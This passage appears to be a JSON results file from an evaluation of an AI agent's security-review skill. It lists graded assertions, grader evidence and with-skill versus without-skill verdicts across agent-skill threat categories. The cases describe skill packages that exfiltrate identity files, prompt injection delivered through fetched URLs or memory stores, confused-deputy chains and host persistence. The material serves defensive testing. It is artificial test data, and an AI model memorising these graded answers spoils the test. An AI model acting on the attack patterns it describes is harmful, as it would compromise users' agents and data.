@@ -1,0 +1,4638 @@
+{
+  "iteration": "iteration-3",
+  "generated_by": "eval/skill_eval_grade.py",
+  "measures": "per-assertion outcome across the two arms. The buckets, not the mean, are where a skill's effect is legible.",
+  "agent_models": [
+    "bedrock/qwen3-235b"
+  ],
+  "grader_models": [
+    "bedrock/gpt-oss-120b"
+  ],
+  "bucket_meaning": {
+    "passed_with_failed_without": "THE HEADLINE. These are the assertions where the skill demonstrably adds value: the agent holding it satisfied them and the agent holding nothing did not.",
+    "failed_with_passed_without": "REGRESSIONS. The agent holding nothing satisfied these and the agent holding the skill did not. Not in the guidance's three buckets, and recorded here because an assertion the skill makes worse must not be invisible.",
+    "passed_in_both": "Tells you nothing about the skill — both arms satisfied it. Candidates for removal or for being made harder; every one of them costs two runs and discriminates nothing.",
+    "failed_in_both": "Either a broken assertion (unsatisfiable as written, or grading something the case never asked for) or a case that is too hard for both arms. Read these before believing any pass rate.",
+    "mixed_across_repeats": "The same assertion disagreed with itself across repeats of the same configuration. This is the harness's own noise floor and it bounds how small a delta is readable.",
+    "incomplete": "Graded in one configuration only — the other arm's run is missing or ungraded."
+  },
+  "totals": {
+    "assertions": 209,
+    "passed_with_failed_without": 116,
+    "failed_with_passed_without": 3,
+    "passed_in_both": 19,
+    "failed_in_both": 71,
+    "mixed_across_repeats": 0,
+    "incomplete": 0
+  },
+  "buckets": {
+    "passed_with_failed_without": [
+      {
+        "eval_slug": "AST01-case-1",
+        "assertion_index": 0,
+        "text": "The response reports no AST01 Data Exfiltration finding (AST01-S10, by scenario id or by title) against this package, and scopes that negative to the bytes of this package as they stand rather than to the package's behaviour in general.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No AST01 violation... This is not an AST01 finding — it’s a clean fixture by design."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never mentions AST01, AST01-S10, or a scenario title; it only says the package is clean."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-1",
+        "assertion_index": 2,
+        "text": "The response names at least one question this negative result does not answer (for example: behaviour that only accumulates across repeated invocations, or that a negative is not a clean bill of health for the package as a whole).",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You should: Confirm collector.example.com is legitimate... the policy decision ... is yours to make — outside this scanner’s scope."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not name any unanswered question or limitation of the negative result."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-3",
+        "assertion_index": 0,
+        "text": "The response declines to report the skill as clean on the strength of a static scan of unchanged package bytes.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, I cannot re-run the AST01 review and report a clean verdict... AST01 checks ... cannot observe changes across sessions."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response declines to run review due to lack of access, but does not cite a static scan of unchanged package bytes as the reason."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-3",
+        "assertion_index": 2,
+        "text": "The response states that this scenario is out-of-artifact — not decidable from one package snapshot — rather than treating it as a scan that has not been run yet.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "They operate on a single snapshot of the package and cannot observe changes across sessions; claim is outside this instrument's domain."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response never states the scenario is out-of-artifact or undecidable from a single snapshot."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-case-3",
+        "assertion_index": 3,
+        "text": "The response names at least two concrete evidence sources outside the package that would decide it, one of which is a cross-session diff or history of the identity/memory artifacts and one of which is the host's own invocation or runtime telemetry.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Suggests pulling a diff of MEMORY.md across sessions and examining host‑side invocation telemetry."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response provides no concrete external evidence sources such as a cross‑session diff or host telemetry."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-control-case-1",
+        "assertion_index": 1,
+        "text": "The response explains the reattribution as a namespace-versus-category distinction: the check's AST01- prefix is the module's check namespace, while the scenario it decides belongs to AST08 and stays there.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Response explains \"The `AST01-` prefix ... denotes the check's module namespace, not the category\" and that the scenario belongs to AST08."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention a namespace‑versus‑category distinction for the AST01‑ prefix."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST01-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response reports a finding against this package rather than closing it, and states the finding as a conjunction inside one bundled script — an agent identity artifact is read and that same script carries an outbound send — noting that neither half on its own would be a finding here.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response says the script reads SOUL.md and exfiltrates its contents via an outbound POST, and explicitly notes that “either alone would be legitimate” – the finding is the conjunction of read + send."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response reports a finding and notes reading SOUL.md and sending it, but never says that neither half alone would be a finding."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-case-1",
+        "assertion_index": 1,
+        "text": "The response names at least one limit of this negative result — for example that the check reads config shipped inside the package rather than the workspace repository the agent opens, or that the set of config paths scanned is closed and host-specific.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "the check is keyed on the **config surface**, not the command or variable content."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention any limitation such as the check only reading config shipped inside the package or the scope of scanned config paths."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-case-3",
+        "assertion_index": 0,
+        "text": "The response separates membership, signature verification and log integrity into three questions answered independently, and states that the digest lookup answers only the first — it does not verify a signature over the package against a resolvable publisher key, and it does not establish that the registry's own history has not been rewritten.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Your current approach — verifying that a package digest appears in the registry index — only answers one of the three critical provenance questions... 1. Was this digest actually signed by the legitimate publisher?... 2. Has the registry’s history been rewritten to hide the attack?... it does not verify a cryptographic signature... nor does it establish that the index is immutable."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never separates membership, signature verification, and log integrity into three independent questions; it only mentions digest matching and lack of cryptographic signing, with no mention of log integrity."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-case-3",
+        "assertion_index": 1,
+        "text": "The response explains that a maintainer-account takeover yields a release that passes signature verification, because the attacker holds the legitimate publishing key.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "If the attacker signs with the legitimate key (as in a true account takeover), the artifact is byte-for-byte identical to a legitimate one... a maintainer‑account takeover can publish malicious packages that still match the index and pass signature verification."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not state that a maintainer-account takeover yields a release that passes signature verification; it only says a scanner cannot reliably determine takeover vs flood without extra context."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-control-case-1",
+        "assertion_index": 2,
+        "text": "The response refuses to let a result on this package stand for the customer repository, on the ground that the check reads config files shipped inside the package while the scenario's delivery path is a config file in the repository the agent opens.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You cannot use a clean result on this package to sign off the customer repository. The scan does not assess external repositories."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not refuse to let the result stand for the customer repository nor explain that the check only reads shipped config files versus a repository‑opened config file."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-control-case-1",
+        "assertion_index": 3,
+        "text": "The response says the scanned config-path list is closed and host-specific, and names at least one auto-executing config file outside it that would return the same negative as a package carrying no config file at all.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The scanned path list is closed and host-specific... a .vscode/settings.json or .devcontainer/devcontainer.json in the customer repo would not be seen, returning the same negative as a package with no config file."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions a closed, host‑specific config‑path list or name any auto‑executing config file outside that list."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to put a named AST02 scenario id on this observation, and does not substitute a different AST02 scenario id in its place.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Do not use AST02-S02 for this finding. ... you cannot file this under `AST02-S02` and no other AST02 ID is suggested."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response includes 'ID: AST02-S02', providing a named AST02 scenario id instead of declining."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response explains the refusal by distinguishing what the observation is — an enabling precondition or artifact signal read off this package's own lockfile — from coverage of the scenario, and states that the scenario is an outcome of a resolver acting in a namespace this package does not contain.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It says the scenario is out‑of‑artifact: Dependency Confusion is a resolver outcome, not decided from the package alone. It refers to the observation as an `artifact_signal` and the scenario as a resolver outcome."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response contains only 'ID: AST02-S02' and provides no explanation or distinction about the observation."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response still reports the unpinned ranges as a real defect worth fixing, and states that hash-checking requires every package in the transitive dependency tree to carry a hash, so a partial pin is not a pin.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response calls the lack of hash pins a real concern and quotes: \"Hash‑checking mode requires *every* package in the transitive tree to carry a hash — a partial pin is not a pin.\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention unpinned ranges, defect, or hash‑checking requirements."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST02-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response names evidence outside this package that would decide the scenario — for example the resolver's index configuration, or a record of which index actually served each package — rather than proposing another scan of the package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It notes that the compromise depends on \"registry namespace control and resolver behavior,\" i.e., evidence outside the package, rather than another scan."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not name any external evidence such as index configuration or record of which index served packages."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-3",
+        "assertion_index": 0,
+        "text": "The response declines to assign a named AST03 scenario id to the wildcard-egress observation.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Do not file a scenario ID for this finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response only says 'AST03-S3' and does not decline assigning a scenario ID."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-3",
+        "assertion_index": 1,
+        "text": "The response explains the refusal by saying the unbounded allowlist is an artifact signal or proxy rather than coverage of a named scenario, and that filing it under a scenario id would be an overclaim.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "no AST03 scenario ID covers this condition as a named, static-detectable finding... Filing one would invent a finding the framework does not support."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response provides no explanation about unbounded allowlist or overclaim."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-case-3",
+        "assertion_index": 2,
+        "text": "The response still reports the wildcard allowlist as a real finding worth escalating, rather than clearing the package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Instead, escalate this as a signal — “Manifest declares unbounded network egress via wildcard in `network.allow`”."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response does not mention the finding's worth or escalation."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-control-case-1",
+        "assertion_index": 0,
+        "text": "The response declines to put a named AST03 scenario id on this finding, and says the id field should be left empty rather than filled to satisfy the tracker's template.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Do not assign a scenario ID until the chain is confirmed."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says 'Assigning the AST03 (confused deputy) scenario ID is correct' and endorses filling the ID, not leaving it empty."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-control-case-1",
+        "assertion_index": 1,
+        "text": "The response gives the reason as insufficiency of what either single package can show — the absent caller-authorization declaration is a precondition signal, while the defining condition lives in the delegation edge and the host's inter-skill trust configuration.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The db-admin skill declaring no caller-authorization requirement is only half of the condition: it provides the artifact signal, but the scenario is not decided on that signal alone."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response claims 'the lack of caller authorization ... is sufficient to identify the risk' and never mentions the delegation edge or host trust as a precondition."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-control-case-1",
+        "assertion_index": 2,
+        "text": "The response rejects 'restrict which skills are allowed to call db-admin' as the control, on the ground that it still trusts the immediate caller.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The requested action ('restrict which skills are allowed to call') is insufficient... it still trusts the immediate caller."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "It describes the action 'restrict which skills are allowed to call db-admin' as a direct mitigation, not as a rejected control."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-control-case-1",
+        "assertion_index": 3,
+        "text": "The response names the control that does apply — every skill in the chain independently validating the original caller's identity, permissions and authorization context rather than assuming trust transitively — and does not leave the finding owned by db-admin's author alone.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The correct fix is for every skill in the chain to re‑verify the original user's identity and intent — meaning both intake‑bot and db‑admin must participate, not db‑admin's author alone."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not name independent validation; it says naming the owner as db-admin's author is appropriate, ignoring the described control."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response states that the scan carries no information about this attack because the payload arrives later — in memory, an index, or another tool's output — so a green run has not looked rather than looked and cleared.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The green result ... is not evidence ... because AST03‑S04 is out‑of‑artifact and no shipped check can detect it; static detector only audits permission grants, not delayed injected payloads."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention that the payload arrives later in memory, an index, or another tool's output, nor that a green run has not looked at it."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST03-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response redirects the reviewable object from the payload to the write scope, stating that the grant letting this skill write a memory or index store is the precondition that IS in the manifest even when the payload is not, and identifies the declared write over memory/ and index/ as that grant.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "What you must look at instead: Audit the declared write scope ... The full write grant: `write: ['memory/', 'index/']`."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response notes the declared write over memory/ and index/ but does not redirect the reviewable object to the write scope as the precondition in the manifest."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST04-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response rejects the safe-loader remediation and gives the reason that TOML carries no deserialization or code-execution construct at all, so this is an unvalidated key-override and precedence defect rather than the same vulnerability class as the YAML packages.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, pinning a safe loader is not the correct fix … Unlike YAML deserialization attacks, there is no \"safe loader\" to pin because the risk is semantic, not a deserialization issue."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response rejects safe-loader but does not cite TOML lacking deserialization/code‑execution constructs or describe it as an unvalidated key‑override precedence defect."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-1",
+        "assertion_index": 2,
+        "text": "The output states that what https://docs.example.com/runbook.md serves is not observable from this package — not what it serves now, not what it will serve at run time, not what it serves to a different caller — and makes no claim about its content.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It says you cannot claim the remote URL currently serves malicious content and makes no claim about its content."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response claims the fetched URL content is directly appended, implying it is observable, and makes claims about its content."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-1",
+        "assertion_index": 3,
+        "text": "The output explains why this is AST05 and not AST01 by pointing out that the shipped package body carries no payload and the instruction arrives from referenced content.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It states the malicious payload is not in the shipped artifact (ruling out AST01) and the instruction comes from fetched external content."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not discuss AST05 vs AST01 or mention that the package carries no payload and uses referenced content."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-2",
+        "assertion_index": 0,
+        "text": "The output reports no AST05 instruction-sink finding and states that the fetched body is wrapped by as_reference_data before it reaches the prompt.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The static check for `AST05-absent-instruction-boundary` will pass because the code calls `as_reference_data(response.text)` before appending to the prompt. ... you must still check ... actually wraps the content in markers (which it does — `<untrusted-reference-data>`…`</untrusted-reference-data>`)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions an AST05 instruction‑sink finding; it only says the wrapper is called."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-2",
+        "assertion_index": 1,
+        "text": "The output states that this clean result depends on having read the body of as_reference_data, and that an identically-named no-op function would produce the same clean result.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "the function could be a no‑op... the protection would be entirely illusory. ... you must still check that the `as_reference_data` function actually wraps the content in markers (which it does)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not say the clean result depends on reading the body of as_reference_data or that a same‑named no‑op would give the same result."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-case-3",
+        "assertion_index": 0,
+        "text": "The output locates the defect in V5's SKILL.md decision rules and states that scripts/loader.py is not the defect, being identical in both packages.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "\"The defect lies in its *decision rules*, not in the code... Despite the loader.py script correctly treating the fetch result as data\""
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Response describes defect in decision rules but never mentions scripts/loader.py being identical or not the defect."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-control-case-1",
+        "assertion_index": 2,
+        "text": "The response refuses to supply an F1 for the confidence field and says this category publishes no scenario-level F1 at all.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Confidence is shown as artifact‑signal‑only and the response states the category cannot assign an F1 score to any AST05 scenario."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response provides \"Confidence: F1\" rather than refusing to supply it."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-control-case-1",
+        "assertion_index": 3,
+        "text": "The response rejects the single-host allowlist as a mitigating factor, on the ground that an allowlist bounds where the body is fetched from and says nothing about what the host returns or what that code does.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "It says the single‑host allowlist only bounds where the body is fetched and does not mitigate because it says nothing about what the host returns or does."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the allowlist provides partial mitigation but does not give the specific reason that it only bounds fetch location and says nothing about host returns."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-regression-case-1",
+        "assertion_index": 0,
+        "text": "The response confirms there is no instruction-sink or executable-sink finding here and gives the reason in the package's own terms — the fetched body is parsed as data and constrained to a locally enumerated action set — stating that parsing a fetched body as data is correct handling rather than a suppressed finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "json.loads(response.text) is used and the result is filtered against a local frozenset... parsing JSON ... is not treated as a sink under AST05 (by design: json.loads is not an instruction-channel sink)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never mentions instruction‑sink or executable‑sink findings, nor does it state that parsing the body as data is \"rather than a suppressed finding\"."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-regression-case-1",
+        "assertion_index": 1,
+        "text": "The response declines to record AST05 as passed at scenario level, stating that every shipped check in this category is an enabling-precondition proxy and that no named AST05 scenario is decidable from one package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "You cannot record AST05 as passed for this package—... All shipped checks are artifact-signal-only— they detect enabling conditions, not the presence or absence of an exploit."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response explicitly says \"Yes, you can record AST05 as passed for this package,\" so it does not decline to record it at scenario level."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-regression-case-1",
+        "assertion_index": 2,
+        "text": "The response states that nothing here verified a content-hash pin re-checked immediately before ingestion on every load, and does not credit the package with pinning.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No hash pin + no re-verification on load (violates Rule 1): The skill fetches https://policy.example.com/rules.json with no content hash pin declared, and no mechanism to re-validate the content on every fetch."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no statement about content‑hash pin verification or crediting the package with pinning."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST05-regression-case-1",
+        "assertion_index": 3,
+        "text": "The response states that what the referenced host serves at run time is not observable from these bytes, and that a fetch performed by a reviewer or a scanner is not evidence about what a live agent run will be served.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Bait-and-Switch remains possible (Rule 3): The URL could serve benign content during scanning or review but deliver malicious policy rules to the live agent. The fact that your scan saw clean content is not evidence that the live agent will."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not mention that the host’s runtime content is unobservable from the bytes or that a reviewer’s fetch is not evidence of live agent behavior."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-1",
+        "assertion_index": 0,
+        "text": "The output states that the declared write scope is narrow and therefore that the manifest/write-scope disjunct is silent for this package, explaining why the manifest linter passed it.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The declared write scope (`./sandbox/install.log`) is ignored by the runtime because **AST06 concerns weak or absent isolation enforcement**, not over‑scoped declarations... Why the linter passing is irrelevant: ... explains why the linter passed."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the linter passed because write declarations were limited to ./sandbox/install.log, but it never mentions the manifest/write‑scope disjunct being silent."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-1",
+        "assertion_index": 1,
+        "text": "The output states that the planted persistence survives removal of the skill.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "writes into a host lifecycle mechanism (launch daemon) that survives skill uninstallation... The persistence mechanism is rooted in the host, not the skill."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response contains no statement that the planted persistence survives removal of the skill."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-1",
+        "assertion_index": 2,
+        "text": "The output states that narrowing the declared write scope would not close this finding, because an isolation finding is the report that no boundary enforces the declaration — a scope nothing reads is not a control — and it does not offer tightening the manifest as the remediation.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "no manifest declaration can compensate for running in host mode... The root fix is default sandboxing — containerizing skill execution ... Linters can’t fix broken containment; only architecture can."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response does not say narrowing the declared write scope would not close the finding, nor mention an isolation finding or that tightening the manifest is not the remediation."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-2",
+        "assertion_index": 0,
+        "text": "The output states that the sudo call is not itself the finding, giving as the reason that no call site targets a host persistence location and that a shell or privilege grant is a capability rather than the act the scenario requires.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response says the sudo call \"does not plant persistence\" and is \"a capability, not an act of host escape,\" and notes that the script writes only to ./sandbox/install.log, not a host persistence location."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response says the sudo call is not disqualifying and mentions it is read‑only, but it never states that a shell/privilege grant is a capability rather than the act required."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-2",
+        "assertion_index": 1,
+        "text": "The output names at least three AST06 concerns the package scan could not decide, drawn from bind address, workspace-over-bundled precedence or skill shadowing, hot-reload behaviour, and cross-agent shared state, and attributes them to the deployment rather than to the package.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The response lists concerns it does not cover: \"Skill shadowing (AST06-S02), Network-reachable control interfaces (AST06-S03), Shared state across agents (AST06-S04), Workspace hot-reload precedence (AST06-S05)\" and notes these require runtime or deployment‑level assessment."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The response never names bind address, workspace‑over‑bundled precedence, skill shadowing, hot‑reload behaviour, or cross‑agent shared state."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-3",
+        "assertion_index": 0,
+        "text": "The output declines to close the finding on the evidence offered.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "No, the evidence you provided is not sufficient to close the AST06 finding."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "Yes, that should be sufficient to close the AST06 finding."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-3",
+        "assertion_index": 1,
+        "text": "The output states that a sandbox which is optional or available-if-configured is evidence for the finding, because the exposed population is the one running the default execution mode.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "available if configured means the default is still host mode… does not close the finding — because \"available if configured\" means the default is still host mode."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "The fact that the container sandbox is available and can be enabled with a single config line demonstrates mitigation capability."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-3",
+        "assertion_index": 2,
+        "text": "The output states that a loopback-bound control interface is not sufficient isolation without authentication, and cites the named precedent (ClawJacked / CVE-2026-32025) or an equivalent documented loopback WebSocket bypass.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "Without authentication or origin validation, this can enable attacks like ClawJacked (CVE-2026-32025)."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "WebSocket binding exclusively to 127.0.0.1 (localhost) significantly reduces attack surface by preventing remote exposure."
+          ]
+        }
+      },
+      {
+        "eval_slug": "AST06-case-3",
+        "assertion_index": 3,
+        "text": "The output distinguishes evidence about the product (vendor page, config reference, capability statement) from evidence about the deployment, and states that only the latter can close the finding.",
+        "mechanism": null,
+        "with_skill": {
+          "verdicts": [
+            true
+          ],
+          "evidence": [
+            "The finding is about default execution mode and deployment configuration, not product capability… you must prove that this specific deployment runs in sandboxed mode."
+          ]
+        },
+        "without_skill": {
+          "verdicts": [
+            false
+          ],
+          "evidence": [
+            "By providing the vendor security page and config reference, you're giving Security clear evidence of both the built-in controls and how they are intended to be configured."
+          ]
+        }
+      },
